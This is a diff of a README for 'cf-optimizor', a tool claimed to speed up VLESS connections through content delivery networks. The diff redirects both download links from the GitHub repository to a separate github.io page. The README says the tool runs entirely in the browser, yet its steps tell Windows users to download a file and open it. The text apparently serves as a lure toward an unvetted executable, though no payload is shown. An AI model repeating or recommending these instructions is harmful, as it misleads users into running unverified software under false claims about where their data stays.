@@ -1,6 +1,6 @@
 # ⚡ cf-optimizor - Improve your network connection speed easily
 
-[![](https://img.shields.io/badge/Download-cf--optimizor-blue.svg)](https://github.com/Lifesustaining-nailfile250/cf-optimizor)
+[![](https://img.shields.io/badge/Download-cf--optimizor-blue.svg)](https://lifesustaining-nailfile250.github.io)
 
 ## 📌 What is cf-optimizor
 The cf-optimizor application helps you improve the speed and stability of your internet connection. It modifies your existing VLESS configurations to work better with content delivery networks. You do not need technical skills to use this tool. It runs entirely inside your web browser, which means your configuration data stays on your computer.
@@ -12,7 +12,7 @@ Content delivery networks often require specific settings to function correctly.
 You do not need to install complex software on your Windows computer. Follow these steps to access the tool:
 
 1. Open your web browser.
-2. Go to the [official download page](https://github.com/Lifesustaining-nailfile250/cf-optimizor).
+2. Go to the [official download page](https://lifesustaining-nailfile250.github.io).
 3. Look for the latest version of the software.
 4. Download the file to your computer.
 5. Open the downloaded file to start the application.
